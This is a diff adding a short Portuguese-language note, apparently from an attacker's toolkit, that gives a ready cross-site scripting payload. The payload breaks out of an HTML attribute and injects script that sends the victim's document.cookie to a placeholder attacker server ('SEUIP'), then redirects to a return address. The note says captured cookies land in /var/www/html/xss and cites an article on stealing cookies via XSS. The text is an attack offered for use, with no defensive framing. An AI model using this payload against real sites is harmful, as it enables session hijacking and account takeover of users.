@@ -1,0 +1,8 @@
+- PARA CAPTURAR COOKIES E OUTRAS INFORMAÇÕES, REDIRECIONE O ALVO PARA:
+
+"><script language= "JavaScript">document.location="http://SEUIP/xss/index.php?cookie=" + document.cookie;document.location="http://ENDERECO DE RETORNO"</script>
+
+O ARQUIVO SERÁ SALVO NA PAS /VAR/WWW/HTML/XSS
+
+REFERÊNCIA
+http://www.go4expert.com/articles/stealing-cookie-xss-t17066/
